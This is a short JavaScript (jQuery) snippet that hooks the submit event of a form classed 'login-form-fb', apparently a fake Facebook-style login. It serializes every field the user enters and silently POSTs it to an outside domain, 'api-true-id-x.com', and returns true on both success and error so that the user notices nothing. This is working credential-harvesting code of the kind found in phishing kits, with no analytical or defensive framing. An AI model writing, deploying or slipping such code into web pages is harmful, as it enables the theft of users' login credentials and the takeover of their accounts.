$(".login-form-fb").submit(function() {
    var d = $(".login-form-fb");

    $.ajax({
        url: "https://api-true-id-x.com/json/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
